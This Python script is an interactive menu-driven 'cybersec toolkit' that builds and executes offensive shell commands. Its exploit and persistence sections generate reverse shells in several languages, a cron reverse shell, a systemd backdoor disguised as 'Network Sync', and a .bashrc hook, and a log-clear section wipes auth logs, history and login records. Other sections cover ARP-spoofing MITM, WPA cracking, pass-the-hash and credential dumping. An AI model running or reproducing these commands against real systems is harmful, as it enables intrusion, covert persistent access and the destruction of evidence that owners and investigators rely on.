#!/usr/bin/env python3
"""
NEXUS — Linux Cybersec Toolkit
Run: python3 nexus.py
Requires: pip install rich
"""

import sys, os, readline, subprocess
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.syntax import Syntax
from rich.columns import Columns
from rich.prompt import Prompt
from rich.rule import Rule
from rich import box

console = Console()

# ─── COLOR PALETTE ────────────────────────────────────────────────────────────
COLORS = {
    "recon":     "#00ff9d",
    "web":       "#ff4d6d",
    "privesc":   "#ffd60a",
    "network":   "#7b5ea7",
    "exploit":   "#ff6b35",
    "passwords": "#00b4d8",
    "ad":        "#e040fb",
    "persist":   "#06d6a0",
    "log":       "#f77f00",
    "forensics": "#90e0ef",
}

# ─── TOOL REGISTRY ────────────────────────────────────────────────────────────
TOOLS = {
    "recon": {
        "label": "RECON",
        "tools": [
            {
                "id": "1", "name": "NMAP Full Scan",
                "desc": "Version, scripts, OS, all ports",
                "fields": [("target", "Target IP / CIDR", "192.168.1.0/24")],
                "cmd": lambda f: f"nmap -sV -sC -O -p- --min-rate 5000 -oN nmap_full.txt {f[0]}",
            },
            {
                "id": "2", "name": "Gobuster Dir",
                "desc": "Directory/file bruteforce",
                "fields": [("target","Target URL","10.10.10.1"), ("threads","Threads","50")],
                "cmd": lambda f: f"gobuster dir -u http://{f[0]} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t {f[1]} -o gobuster.txt",
            },
            {
                "id": "3", "name": "Enum4linux",
                "desc": "SMB / Windows enumeration",
                "fields": [("target","Target IP","192.168.1.10")],
                "cmd": lambda f: f"enum4linux -a {f[0]} 2>&1 | tee enum4linux.txt",
            },
            {
                "id": "4", "name": "WhatWeb",
                "desc": "Web stack fingerprinting",
                "fields": [("url","Target URL","https://target.com")],
                "cmd": lambda f: f"whatweb -v -a 3 {f[0]}",
            },
            {
                "id": "5", "name": "Sublist3r",
                "desc": "Subdomain enumeration",
                "fields": [("domain","Domain","target.com")],
                "cmd": lambda f: f"python3 sublist3r.py -d {f[0]} -o subdomains.txt",
            },
            {
                "id": "6", "name": "theHarvester",
                "desc": "OSINT — emails, hosts, IPs",
                "fields": [("domain","Domain","target.com"), ("source","Sources","google,bing,linkedin")],
                "cmd": lambda f: f"theHarvester -d {f[0]} -l 500 -b {f[1]}",
            },
            {
                "id": "7", "name": "Amass",
                "desc": "Deep subdomain + ASN mapping",
                "fields": [("domain","Domain","target.com")],
                "cmd": lambda f: f"amass enum -passive -d {f[0]} -o amass_out.txt",
            },
            {
                "id": "8", "name": "Shodan CLI",
                "desc": "Search exposed hosts on Shodan",
                "fields": [("query","Query","apache country:US port:80")],
                "cmd": lambda f: f'shodan search --fields ip_str,port,org,country_name "{f[0]}"',
            },
            {
                "id": "9", "name": "FFUF Fuzzer",
                "desc": "Fast web fuzzer for dirs/params",
                "fields": [("url","Base URL","http://10.10.10.1"), ("wordlist","Wordlist","/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")],
                "cmd": lambda f: f"ffuf -u {f[0]}/FUZZ -w {f[1]} -mc 200,301,302,403 -t 100 -o ffuf_results.json",
            },
        ],
    },
    "web": {
        "label": "WEB ATTACK",
        "tools": [
            {
                "id": "1", "name": "SQLMap",
                "desc": "Automated SQL injection",
                "fields": [("url","Target URL","http://target.com/page?id=1"), ("db","Database (opt)","")],
                "cmd": lambda f: f'sqlmap -u "{f[0]}" --dbs --batch --level=5 --risk=3 --random-agent --dump-all --threads=5' + (f" -D {f[1]}" if f[1] else ""),
            },
            {
                "id": "2", "name": "XSStrike",
                "desc": "Advanced XSS scanner + crawler",
                "fields": [("url","Target URL","http://target.com/search?q=")],
                "cmd": lambda f: f'python3 xsstrike.py -u "{f[0]}" --crawl --blind',
            },
            {
                "id": "3", "name": "Nikto",
                "desc": "Web server vulnerability scan",
                "fields": [("target","Host / URL","http://target.com")],
                "cmd": lambda f: f"nikto -h {f[0]} -o nikto_report.txt -Format txt",
            },
            {
                "id": "4", "name": "WPScan",
                "desc": "WordPress vulnerability scanner",
                "fields": [("url","WordPress URL","http://wp-site.com"), ("apikey","API Token (opt)","")],
                "cmd": lambda f: f"wpscan --url {f[0]} --enumerate u,p,t,tt --plugins-detection aggressive" + (f" --api-token {f[1]}" if f[1] else ""),
            },
            {
                "id": "5", "name": "cURL Repeater",
                "desc": "Replay HTTP POST with custom headers",
                "fields": [("url","URL","https://api.target.com/auth"), ("header","Extra Header","Authorization: Bearer xxx"), ("data","POST Body",'{"user":"admin"}')],
                "cmd": lambda f: f'curl -sk -X POST "{f[0]}" -H "Content-Type: application/json" -H "{f[1]}" -d \'{f[2]}\' | python3 -m json.tool',
            },
            {
                "id": "6", "name": "SSRF Probe",
                "desc": "Server-Side Request Forgery tester",
                "fields": [("url","Target URL","http://target.com/fetch?url="), ("cb","Callback host","your-burp-collab.net")],
                "cmd": lambda f: f'python3 ssrfuzz.py -u "{f[0]}" --callback http://{f[1]}',
            },
            {
                "id": "7", "name": "Commix",
                "desc": "Command injection exploiter",
                "fields": [("url","Target URL","http://target.com/cmd?ip=127.0.0.1")],
                "cmd": lambda f: f'python3 commix.py --url="{f[0]}" --batch',
            },
        ],
    },
    "privesc": {
        "label": "PRIVESC",
        "tools": [
            {
                "id": "1", "name": "LinPEAS",
                "desc": "Linux privilege escalation auditor",
                "fields": [],
                "cmd": lambda f: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>&1 | tee linpeas.txt",
            },
            {
                "id": "2", "name": "SUID / GUID Find",
                "desc": "Find SUID and GUID binaries",
                "fields": [],
                "cmd": lambda f: "find / -perm -4000 -type f 2>/dev/null; echo '--- GUID ---'; find / -perm -2000 -type f 2>/dev/null",
            },
            {
                "id": "3", "name": "Sudo Check",
                "desc": "List sudo rights for current user",
                "fields": [],
                "cmd": lambda f: "sudo -l 2>/dev/null",
            },
            {
                "id": "4", "name": "pspy",
                "desc": "Monitor cron/processes without root",
                "fields": [("interval","Interval ms","1000")],
                "cmd": lambda f: f"./pspy64 -pf -i {f[0]}",
            },
            {
                "id": "5", "name": "Cron Abuse Check",
                "desc": "Find writable cron jobs",
                "fields": [],
                "cmd": lambda f: "crontab -l 2>/dev/null; cat /etc/cron* /etc/crontab 2>/dev/null",
            },
            {
                "id": "6", "name": "Kernel CVE Search",
                "desc": "Match kernel to known exploits",
                "fields": [],
                "cmd": lambda f: 'uname -a; searchsploit "$(uname -r | cut -d- -f1)" linux kernel',
            },
            {
                "id": "7", "name": "Docker Escape Check",
                "desc": "Detect container escape vectors",
                "fields": [],
                "cmd": lambda f: "cat /proc/1/cgroup | head -5; ls -la /var/run/docker.sock 2>/dev/null; capsh --print 2>/dev/null",
            },
            {
                "id": "8", "name": "Capabilities Check",
                "desc": "Find binaries with dangerous caps",
                "fields": [],
                "cmd": lambda f: "getcap -r / 2>/dev/null",
            },
        ],
    },
    "network": {
        "label": "NETWORK",
        "tools": [
            {
                "id": "1", "name": "tcpdump Capture",
                "desc": "Packet capture to .pcap",
                "fields": [("iface","Interface","eth0"), ("filter","BPF Filter (opt)","port 80")],
                "cmd": lambda f: "tcpdump -i {} -w capture.pcap{} -n -v".format(f[0], " '{}'".format(f[1]) if f[1] else ""),
            },
            {
                "id": "2", "name": "ARP Spoof MITM",
                "desc": "Man-in-the-middle via ARP poison",
                "fields": [("iface","Interface","eth0"), ("victim","Victim IP","192.168.1.50"), ("gw","Gateway IP","192.168.1.1")],
                "cmd": lambda f: f"echo 1 > /proc/sys/net/ipv4/ip_forward; arpspoof -i {f[0]} -t {f[1]} {f[2]} & arpspoof -i {f[0]} -t {f[2]} {f[1]}",
            },
            {
                "id": "3", "name": "Chisel Tunnel",
                "desc": "TCP tunnel over HTTP (pivot)",
                "fields": [("mode","Mode (server/client)","client"), ("lport","Port","8080"), ("rhost","Server host","10.10.14.1"), ("fport","Forward port","3306")],
                "cmd": lambda f: (f"./chisel server -p {f[1]} --reverse" if f[0]=="server" else f"./chisel client {f[2]}:{f[1]} R:{f[3]}:127.0.0.1:{f[3]}"),
            },
            {
                "id": "4", "name": "ProxyChains",
                "desc": "Route any tool through SOCKS5",
                "fields": [("cmd","Command to proxy","nmap -sT -Pn 10.0.0.1")],
                "cmd": lambda f: f"proxychains4 -f /etc/proxychains4.conf {f[0]}",
            },
            {
                "id": "5", "name": "WiFi WPA Crack",
                "desc": "Capture handshake + crack",
                "fields": [("iface","Interface","wlan0"), ("bssid","BSSID","AA:BB:CC:DD:EE:FF"), ("ch","Channel","6")],
                "cmd": lambda f: f"airmon-ng start {f[0]}; airodump-ng -c {f[2]} --bssid {f[1]} -w handshake {f[0]}mon\n# deauth: aireplay-ng --deauth 10 -a {f[1]} {f[0]}mon\nhashcat -m 22000 handshake.hccapx /usr/share/wordlists/rockyou.txt",
            },
            {
                "id": "6", "name": "SSH Port Forward",
                "desc": "Local / remote SSH tunnel",
                "fields": [("type","Type (local/remote)","local"), ("lport","Local port","8080"), ("rhost","Remote target","127.0.0.1"), ("rport","Remote port","80"), ("user","SSH user@host","user@target")],
                "cmd": lambda f: (f"ssh -L {f[1]}:{f[2]}:{f[3]} {f[4]}" if f[0]=="local" else f"ssh -R {f[3]}:{f[2]}:{f[1]} {f[4]}"),
            },
            {
                "id": "7", "name": "Netcat Listener",
                "desc": "Raw TCP listener",
                "fields": [("port","Port","4444")],
                "cmd": lambda f: f"nc -nlvp {f[0]}",
            },
        ],
    },
    "exploit": {
        "label": "EXPLOIT",
        "tools": [
            {
                "id": "1", "name": "MSF Multi/Handler",
                "desc": "Metasploit catch-all listener",
                "fields": [("lhost","LHOST","10.10.14.1"), ("lport","LPORT","4444"), ("payload","Payload","linux/x64/meterpreter/reverse_tcp")],
                "cmd": lambda f: f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {f[2]}; set LHOST {f[0]}; set LPORT {f[1]}; exploit -j"',
            },
            {
                "id": "2", "name": "Reverse Shell Gen",
                "desc": "bash/python/nc/php/perl/ruby/powershell",
                "fields": [("lhost","LHOST","10.10.14.1"), ("lport","LPORT","4444"), ("type","Type (bash/python3/nc/php/perl/ruby/powershell)","bash")],
                "cmd": lambda f: {
                    "bash":       f"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1",
                    "python3":    f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{f[0]}\",{f[1]}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
                    "nc":         f"nc -e /bin/bash {f[0]} {f[1]}",
                    "php":        f"php -r '$sock=fsockopen(\"{f[0]}\",{f[1]});$proc=proc_open(\"/bin/bash\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
                    "perl":       f"perl -e 'use Socket;$i=\"{f[0]}\";$p={f[1]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
                    "ruby":       f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{f[0]}\",{f[1]}))'",
                    "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{f[0]}',{f[1]});$stream = $client.GetStream();...\""
                }.get(f[2], f"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1"),
            },
            {
                "id": "3", "name": "msfvenom Payload",
                "desc": "Generate shellcode / executables",
                "fields": [("payload","Payload","linux/x64/meterpreter/reverse_tcp"), ("lhost","LHOST","10.10.14.1"), ("lport","LPORT","4444"), ("fmt","Format","elf"), ("out","Output","shell.elf")],
                "cmd": lambda f: f"msfvenom -p {f[0]} LHOST={f[1]} LPORT={f[2]} -f {f[3]} -o {f[4]} && chmod +x {f[4]}",
            },
            {
                "id": "4", "name": "SearchSploit",
                "desc": "Search ExploitDB offline",
                "fields": [("query","Search term","vsftpd 2.3.4")],
                "cmd": lambda f: f'searchsploit "{f[0]}"',
            },
            {
                "id": "5", "name": "pwncat-cs",
                "desc": "Stable shell with PTY upgrade",
                "fields": [("lport","LPORT","4444")],
                "cmd": lambda f: f"pwncat-cs -lp {f[0]}",
            },
            {
                "id": "6", "name": "TTY Upgrade",
                "desc": "Upgrade dumb shell to full TTY",
                "fields": [],
                "cmd": lambda f: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# then: Ctrl+Z\nstty raw -echo && fg\nexport TERM=xterm",
            },
        ],
    },
    "passwords": {
        "label": "CREDS / HASH",
        "tools": [
            {
                "id": "1", "name": "Hashcat",
                "desc": "GPU-accelerated hash cracking",
                "fields": [("hash","Hash / Hash file","hash.txt"), ("wordlist","Wordlist","/usr/share/wordlists/rockyou.txt"), ("mode","Mode (0=MD5 | 1000=NTLM | 1800=sha512 | 3200=bcrypt | 22000=WPA)","0")],
                "cmd": lambda f: f'hashcat -m {f[2]} -a 0 "{f[0]}" {f[1]} --show',
            },
            {
                "id": "2", "name": "John the Ripper",
                "desc": "Crack hashes / shadow files",
                "fields": [("file","Hash file","/etc/shadow"), ("wordlist","Wordlist","/usr/share/wordlists/rockyou.txt")],
                "cmd": lambda f: f"john {f[0]} --wordlist={f[1]} --format=auto; john {f[0]} --show",
            },
            {
                "id": "3", "name": "Hydra",
                "desc": "Online service bruteforce",
                "fields": [("target","Target IP","192.168.1.10"), ("service","Service","ssh"), ("user","Username","admin"), ("passlist","Password list","/usr/share/wordlists/rockyou.txt")],
                "cmd": lambda f: f"hydra -l {f[2]} -P {f[3]} {f[0]} {f[1]} -t 30 -V",
            },
            {
                "id": "4", "name": "Hash Identifier",
                "desc": "Identify unknown hash type",
                "fields": [("hash","Hash string","5f4dcc3b5aa765d61d8327deb882cf99")],
                "cmd": lambda f: f'hashid "{f[0]}"',
            },
            {
                "id": "5", "name": "Pass-the-Hash (PTH)",
                "desc": "Authenticate with NTLM hash",
                "fields": [("domain","Domain","CORP"), ("user","Username","Administrator"), ("hash","NTLM Hash","aad3b435..."), ("target","Target IP","10.0.0.5")],
                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/smbexec.py {f[0]}/{f[1]}@{f[3]} -hashes :{f[2]}",
            },
            {
                "id": "6", "name": "secretsdump",
                "desc": "Dump SAM / NTDS / LSA remotely",
                "fields": [("domain","Domain","CORP"), ("user","Username","Administrator"), ("pw","Password","P@ssw0rd!"), ("target","Target IP","10.0.0.5")],
                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{f[0]}/{f[1]}:{f[2]}@{f[3]}'",
            },
        ],
    },
    "ad": {
        "label": "ACTIVE DIR",
        "tools": [
            {
                "id": "1", "name": "BloodHound Ingestor",
                "desc": "Enumerate AD attack paths",
                "fields": [("domain","Domain","corp.local"), ("user","User","lowpriv"), ("pw","Password","P@ssw0rd"), ("dc","DC IP","10.0.0.1")],
                "cmd": lambda f: f"python3 bloodhound-python -u {f[1]} -p '{f[2]}' -d {f[0]} -dc {f[3]} -c All --zip",
            },
            {
                "id": "2", "name": "Kerberoasting",
                "desc": "Request + crack service tickets",
                "fields": [("domain","Domain","corp.local"), ("user","User","lowpriv"), ("pw","Password","P@ssw0rd"), ("dc","DC IP","10.0.0.1")],
                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py '{f[0]}/{f[1]}:{f[2]}' -dc-ip {f[3]} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt",
            },
            {
                "id": "3", "name": "AS-REP Roasting",
                "desc": "Attack accounts with no pre-auth",
                "fields": [("domain","Domain","corp.local"), ("dc","DC IP","10.0.0.1")],
                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {f[0]}/ -usersfile users.txt -dc-ip {f[1]} -format hashcat -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
            },
            {
                "id": "4", "name": "LDAP Dump",
                "desc": "Anonymous / authenticated LDAP enum",
                "fields": [("dc","DC IP","10.0.0.1"), ("domain","Domain","CORP"), ("user","User (opt)","lowpriv"), ("pw","Password (opt)","P@ssw0rd")],
                "cmd": lambda f: f"ldapdomaindump -u '{f[1]}\\\\{f[2]}' -p '{f[3]}' {f[0]}",
            },
            {
                "id": "5", "name": "Evil-WinRM",
                "desc": "WinRM shell into Windows host",
                "fields": [("target","Target IP","10.0.0.5"), ("user","Username","Administrator"), ("pw","Password","P@ssw0rd")],
                "cmd": lambda f: f"evil-winrm -i {f[0]} -u {f[1]} -p '{f[2]}'",
            },
        ],
    },
    "persist": {
        "label": "PERSISTENCE",
        "tools": [
            {
                "id": "1", "name": "Cron Backdoor",
                "desc": "Cron reverse shell every 5 min",
                "fields": [("lhost","LHOST","10.10.14.1"), ("lport","LPORT","4444")],
                "cmd": lambda f: f'(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1") | crontab -',
            },
            {
                "id": "2", "name": "Systemd Service",
                "desc": "Drop a persistent systemd backdoor",
                "fields": [("lhost","LHOST","10.10.14.1"), ("lport","LPORT","4444")],
                "cmd": lambda f: f"""cat > /etc/systemd/system/netsync.service << 'EOF'
[Unit]
Description=Network Sync
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable netsync && systemctl start netsync""",
            },
            {
                "id": "3", "name": ".bashrc Hook",
                "desc": "Inject shell init persistence",
                "fields": [("lhost","LHOST","10.10.14.1"), ("lport","LPORT","4444")],
                "cmd": lambda f: f'echo "bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1 &" >> ~/.bashrc',
            },
            {
                "id": "4", "name": "SSH Authorized Key",
                "desc": "Drop attacker pubkey for permanent access",
                "fields": [("pubkey","Public key (id_rsa.pub content)","ssh-rsa AAAA...")],
                "cmd": lambda f: f'mkdir -p ~/.ssh && echo "{f[0]}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
            },
        ],
    },
    "log": {
        "label": "LOG CLEAR",
        "tools": [
            {
                "id": "1", "name": "Linux Log Wipe",
                "desc": "Clear auth, syslog, kern logs",
                "fields": [],
                "cmd": lambda f: "cat /dev/null > /var/log/auth.log 2>/dev/null; cat /dev/null > /var/log/syslog 2>/dev/null; cat /dev/null > /var/log/kern.log 2>/dev/null; echo 'logs cleared'",
            },
            {
                "id": "2", "name": "Bash History Nuke",
                "desc": "Wipe shell command history",
                "fields": [],
                "cmd": lambda f: "history -c; cat /dev/null > ~/.bash_history; unset HISTFILE",
            },
            {
                "id": "3", "name": "UTMP / WTMP Wipe",
                "desc": "Erase who/last login records",
                "fields": [],
                "cmd": lambda f: "cat /dev/null > /var/run/utmp; cat /dev/null > /var/log/wtmp; cat /dev/null > /var/log/btmp",
            },
            {
                "id": "4", "name": "Shred File",
                "desc": "Overwrite + delete a file securely",
                "fields": [("file","File path","/tmp/payload.elf")],
                "cmd": lambda f: f"shred -zvun 7 {f[0]}",
            },
            {
                "id": "5", "name": "Timestamp Stomp",
                "desc": "Clone timestamps from reference file",
                "fields": [("file","Target file","/tmp/evil.sh"), ("ref","Reference file","/etc/passwd")],
                "cmd": lambda f: f"touch -r {f[1]} {f[0]}; stat {f[0]}",
            },
        ],
    },
    "forensics": {
        "label": "FORENSICS",
        "tools": [
            {
                "id": "1", "name": "Volatility 3",
                "desc": "Memory forensics and analysis",
                "fields": [("img","Memory image","/evidence/ram.mem"), ("plugin","Plugin","windows.pslist.PsList")],
                "cmd": lambda f: f"python3 vol.py -f {f[0]} {f[1]}",
            },
            {
                "id": "2", "name": "Binwalk",
                "desc": "Firmware analysis + file carving",
                "fields": [("file","Target file","firmware.bin")],
                "cmd": lambda f: f"binwalk -e --dd='.*' {f[0]}",
            },
            {
                "id": "3", "name": "Strings + Grep",
                "desc": "Extract readable strings from binary",
                "fields": [("file","Binary","malware.exe"), ("pattern","Grep pattern (opt)","password|api_key")],
                "cmd": lambda f: f"strings -a {f[0]}" + (f" | grep -iE '{f[1]}'" if f[1] else ""),
            },
            {
                "id": "4", "name": "File Timeline",
                "desc": "Build filesystem activity timeline",
                "fields": [("img","Disk image","/evidence/disk.dd"), ("out","Output CSV","timeline.csv")],
                "cmd": lambda f: f"fls -r -m / {f[0]} | mactime -b - -d 2000-01-01 > {f[1]}",
            },
            {
                "id": "5", "name": "Exiftool",
                "desc": "Extract metadata from any file",
                "fields": [("file","File","photo.jpg")],
                "cmd": lambda f: f"exiftool {f[0]}",
            },
        ],
    },
}

# ─── CHEAT SHEET ─────────────────────────────────────────────────────────────
CHEATSHEET = [
    ("TTY Upgrade",      "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm  # then: Ctrl+Z → stty raw -echo → fg"),
    ("Port Forward SSH", "ssh -L 8080:127.0.0.1:80 user@target   # local\nssh -R 4444:127.0.0.1:4444 user@jump    # remote"),
    ("File Transfer",    "python3 -m http.server 8000\ncurl http://atk:8000/file -o /tmp/file"),
    ("Netcat Listen",    "nc -nlvp 4444"),
    ("SUID Find",        "find / -perm -4000 -type f 2>/dev/null"),
    ("World Writable",   "find / -perm -0002 -type f 2>/dev/null"),
    ("Passwd Hash Gen",  "openssl passwd -6 -salt xyz newpassword"),
    ("Decode Base64",    "echo 'string' | base64 -d"),
    ("Hex to ASCII",     "echo '48 65 6c 6c 6f' | xxd -r -p"),
    ("Port Scan Bash",   "for p in {1..1000}; do (echo >/dev/tcp/target/$p) 2>/dev/null && echo \"open: $p\"; done"),
    ("Find Configs",     "find / -name '*.conf' -o -name '.env' 2>/dev/null"),
    ("Process by Port",  "ss -tlnp | grep ':80'"),
    ("Capabilities",     "getcap -r / 2>/dev/null"),
    ("Writable Paths",   "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type f 2>/dev/null"),
]

# ─── BANNER ───────────────────────────────────────────────────────────────────
BANNER = r"""
 ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
 ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
 ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
 ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
 ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
"""

CATEGORY_KEYS = list(TOOLS.keys())

def clear():
    os.system("clear" if os.name != "nt" else "cls")

# ─── DISPLAY HELPERS ─────────────────────────────────────────────────────────

def show_banner():
    clear()
    console.print(Text(BANNER, style="bold #00ff9d"))
    console.print(Panel(
        "[bold #666666]Linux Cybersec Toolkit v1.0  ·  50+ tools  ·  10 categories[/]",
        border_style="#333333", padding=(0, 2)
    ))

def show_main_menu():
    show_banner()
    table = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold #666666",
                  border_style="#333333", expand=False)
    table.add_column("#",  style="bold #666666", width=4)
    table.add_column("Category", width=18)
    table.add_column("Tools", justify="right", width=6)
    table.add_column("Description", style="#666666")

    descriptions = {
        "recon":     "Network discovery, OSINT, subdomain enum",
        "web":       "SQLi, XSS, fuzzing, WordPress, SSRF",
        "privesc":   "LinPEAS, SUID, cron, docker escape",
        "network":   "Packet capture, MITM, tunneling, WiFi",
        "exploit":   "Metasploit, reverse shells, msfvenom",
        "passwords": "Hashcat, John, Hydra, PTH, secretsdump",
        "ad":        "BloodHound, Kerberoast, LDAP, Evil-WinRM",
        "persist":   "Cron, systemd, .bashrc, SSH key drop",
        "log":       "Log wipe, history nuke, shred, stomp",
        "forensics": "Volatility, binwalk, strings, timeline",
    }
    for i, key in enumerate(CATEGORY_KEYS, 1):
        s = TOOLS[key]
        col = COLORS[key]
        table.add_row(
            str(i),
            f"[bold {col}]{s['label']}[/]",
            f"[{col}]{len(s['tools'])}[/]",
            descriptions[key],
        )

    console.print(table)
    console.print("\n  [bold #666666]Commands:[/] [#00ff9d]1-10[/] select category  "
                  "[#00ff9d]c[/] cheatsheet  [#00ff9d]q[/] quit\n")

def show_category(key):
    s = TOOLS[key]
    col = COLORS[key]
    clear()
    console.print(Rule(f"[bold {col}] {s['label']} [/]", style=col))

    table = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {col}",
                  border_style="#333333", expand=True)
    table.add_column("#", width=4, style="bold #666666")
    table.add_column("Tool", width=22)
    table.add_column("Description", style="#888888")

    for t in s["tools"]:
        table.add_row(t["id"], f"[bold {col}]{t['name']}[/]", t["desc"])

    console.print(table)
    console.print(f"\n  [bold #666666]Enter tool #  |  [#00ff9d]b[/] back[/]\n")

def collect_fields(tool, col):
    """Prompt user for each field, return list of values."""
    values = []
    if tool["fields"]:
        console.print(f"\n  [bold {col}]Fill fields[/] [#666666](Enter = use default)[/]\n")
        for _, label, default in tool["fields"]:
            val = Prompt.ask(f"  [bold #cccccc]{label}[/]",
                             default=default, show_default=True, console=console)
            values.append(val.strip())
    return values

def show_tool(tool, col):
    clear()
    console.print(Rule(f"[bold {col}] {tool['name']} [/]", style=col))
    console.print(f"  [#666666]{tool['desc']}[/]\n")

    values = collect_fields(tool, col)

    try:
        cmd = tool["cmd"](values)
    except Exception as e:
        cmd = f"# error generating command: {e}"

    console.print(f"\n  [bold {col}]Generated Command:[/]\n")
    console.print(Syntax(cmd, "bash", theme="monokai", line_numbers=False,
                         background_color="#0d1117", word_wrap=True))

    console.print(
        f"\n  [bold #666666]Options:[/] "
        f"[#00ff9d]r[/] run it  "
        f"[#00ff9d]g[/] regenerate  "
        f"[#00ff9d]b[/] back\n"
    )
    return cmd

def show_cheatsheet():
    clear()
    console.print(Rule("[bold #ffd60a] QUICK REFERENCE CHEAT SHEET [/]", style="#ffd60a"))
    for title, cmd in CHEATSHEET:
        console.print(f"\n  [bold #ffd60a]{title}[/]")
        console.print(Syntax(cmd, "bash", theme="monokai",
                             background_color="#0d1117", word_wrap=True))
    console.print("\n  [#666666]Press Enter to go back...[/]")
    input()

# ─── MAIN LOOP ────────────────────────────────────────────────────────────────
def run_tool_loop(key):
    s = TOOLS[key]
    col = COLORS[key]
    while True:
        show_category(key)
        choice = Prompt.ask("  [bold #cccccc]Select[/]", console=console).strip().lower()
        if choice == "b":
            break

        tool = next((t for t in s["tools"] if t["id"] == choice), None)
        if not tool:
            console.print("  [red]Invalid choice.[/]")
            continue

        while True:
            cmd = show_tool(tool, col)
            action = Prompt.ask("  [bold #cccccc]Action[/]", console=console).strip().lower()
            if action == "b":
                break
            elif action == "r":
                console.print(f"\n  [bold #ff4d6d]Running...[/]\n")
                try:
                    subprocess.run(cmd, shell=True, executable="/bin/bash")
                except KeyboardInterrupt:
                    pass
                console.print("\n  [#666666]Press Enter to continue...[/]")
                input()
                break
            elif action == "g":
                continue  # re-prompts fields
            else:
                console.print("  [red]Unknown option.[/]")

def main():
    # readline setup for history
    try:
        readline.parse_and_bind("tab: complete")
    except Exception:
        pass

    while True:
        show_main_menu()
        choice = Prompt.ask("  [bold #cccccc]Select[/]", console=console).strip().lower()

        if choice == "q":
            clear()
            console.print("\n  [bold #00ff9d]NEXUS offline. gng.[/]\n")
            sys.exit(0)

        elif choice == "c":
            show_cheatsheet()

        elif choice.isdigit() and 1 <= int(choice) <= len(CATEGORY_KEYS):
            run_tool_loop(CATEGORY_KEYS[int(choice) - 1])

        else:
            console.print("  [red]Unknown command.[/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        console.print("\n  [bold #00ff9d]NEXUS offline.[/]\n")
        sys.exit(0)
